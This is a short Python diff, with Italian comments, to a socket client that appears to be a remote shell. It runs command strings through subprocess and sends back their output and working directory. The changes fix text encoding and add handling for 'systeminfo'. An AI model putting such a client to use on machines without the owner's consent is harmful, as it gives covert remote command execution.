@@ -29,7 +29,7 @@ def invia_messaggio(messaggio):
     global clientSocket
     while True:
         try:
-            clientSocket.send(messaggio.encode())
+            clientSocket.send(messaggio.encode('utf-8','ignore'))
             break
         except Exception as e:
             #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e rimandiamo il messaggio
@@ -41,7 +41,7 @@ def ricevi_messaggio():
     global clientSocket
     while True:
         try:
-            messaggio = clientSocket.recv(BUFFER_SIZE).decode()
+            messaggio = clientSocket.recv(BUFFER_SIZE).decode('utf-8','ignore')
             return messaggio
         except Exception as e:
             #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e la ricezione del messaggio
@@ -218,6 +218,8 @@ def executeShellCommand(cmd):
                     output = str(e)
                 else:
                     output = ''
+    elif cmd == 'systeminfo':
+        output = subprocess.check_output([cmd]).decode('utf-8','ignore')
     else: 
         output = subprocess.getoutput(cmd)
     cwd = os.getcwd()
